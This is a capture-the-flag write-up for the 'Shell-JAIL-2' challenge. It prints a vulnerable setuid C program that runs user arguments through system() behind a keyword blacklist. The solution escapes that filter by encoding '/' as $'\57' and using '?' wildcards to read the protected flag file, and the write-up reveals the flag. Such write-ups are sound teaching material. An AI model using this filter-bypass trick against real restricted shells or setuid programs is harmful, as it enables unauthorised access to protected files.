Shell-JAIL-2
==================
**Category**: Pwn  **Points**: 250

Challenge Description
------

```
Download the login private key, then run:

ssh -p 31337 -i login shjail@shelljail2.wpictf.xyz

redundant servers on 31338 and 31339

made by Ben Chaney

```

Solutions
----------
This is the second jail break challenge, the files are all the same except for one line in access.c

```
54cd9d6b47ef:/home/pc_owner$ ls -la
total 28
drwxr-xr-x    1 pc_owner pc_owner      4096 Apr 13 08:03 .
drwxr-xr-x    1 root     root          4096 Apr 13 08:03 ..
-r-sr-sr-x    1 pc_owner pc_owner     10912 Apr 13 08:03 access
-r--r--r--    1 pc_owner pc_owner      1030 Apr 13 05:39 access.c
-r--r-----    1 pc_owner pc_owner        28 Apr 13 05:39 flag.txt
54cd9d6b47ef:/home/pc_owner$ 
```
Cat access.c
```
54cd9d6b47ef:/home/pc_owner$ cat access.c
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <string.h>

char *gen_cmd(int argc, const char **argv){
	size_t total_size = 1;
	for(int it = 1; it < argc; it++){
		total_size+= strlen(argv[it]);
	}
	char *ret = malloc(total_size);
	total_size = 0;
	for(int it = 1; it < argc; it++){
		size_t len = strlen(argv[it]);
		memcpy(ret+total_size, argv[it], len); 
		total_size+= len;
		ret[total_size] = ' ';
		total_size++;
	}
	ret[total_size] = '\0';
	return ret;
}

int filter(const char *cmd){
	int valid = 1;
	valid &= strstr(cmd, "*") == NULL;
	valid &= strstr(cmd, "sh") == NULL;
	valid &= strstr(cmd, "/") == NULL;
	valid &= strstr(cmd, "home") == NULL;
	valid &= strstr(cmd, "pc_owner") == NULL;
	valid &= strstr(cmd, "flag") == NULL;
	valid &= strstr(cmd, "txt") == NULL;
	return valid;
}


int main(int argc, const char **argv){
	setreuid(UID, UID);
	char *cmd = gen_cmd(argc, argv);
	if (!filter(cmd)){
		exit(-1);
	}
	setenv("PATH", "", 1); 
	system(cmd);
}

```

This time the line `setenv("PATH", "", 1);` is really a hassle, without environment variables we must specify the full 
path like `/bin/cat`

Luckily we can still use `$, \, '` therefore we can specify `/` as `$'\57'`, 57 being the octave value of the backslash.

My solution was
```
39a698d34cd4:/home/pc_owner$ ./access "$'\57'bin$'\57'cat f???.???"
wpi{p0s1x_sh3Lls_ar3_w13rD}
```
`flag: wpi{p0s1x_sh3Lls_ar3_w13rD}`
